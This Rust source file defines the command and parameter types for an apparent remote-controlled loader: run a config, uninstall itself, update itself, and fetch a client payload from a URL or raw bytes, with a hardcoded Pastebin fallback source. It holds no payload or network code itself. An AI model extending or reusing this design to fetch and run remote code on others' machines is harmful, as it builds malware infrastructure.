use serde::{ Deserialize, Serialize };
use crate::constants::{
    hardcoded_client_fallback_source_loader_pastebin,
    hardcoded_client_version,
    loader_version,
};

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct LdrRcv {
    pub action: ClAct,
    pub params: ClPrms,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ClAct {
    RnCnfg,
    UnsSlf,
    UpdSlf,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ClPrms {
    RnCnfg(RnCnfgPrms),
    UnsSlf(UnsSlfPrms),
    UpdSlf(UpdSlfPrms),
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum FlSrc {
    Url(String),
    Bt(Vec<u8>),
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct RnCnfgPrms {
    pub enbl: bool, // if disabled not even run
    pub cl_src: Option<FlSrc>,
    pub cl_vrs: u64,
    pub slf_src: Option<FlSrc>,
    pub slf_vrs: u64,
    pub upd_enbl: bool, // reinstall updated if version higher
}

impl Default for RnCnfgPrms {
    fn default() -> Self {
        Self {
            enbl: true,
            cl_src: hardcoded_client_fallback_source_loader_pastebin(),
            cl_vrs: hardcoded_client_version(),
            slf_src: None,
            slf_vrs: loader_version(),
            upd_enbl: false,
        }
    }
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UnsSlfPrms {}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UpdSlfPrms {}
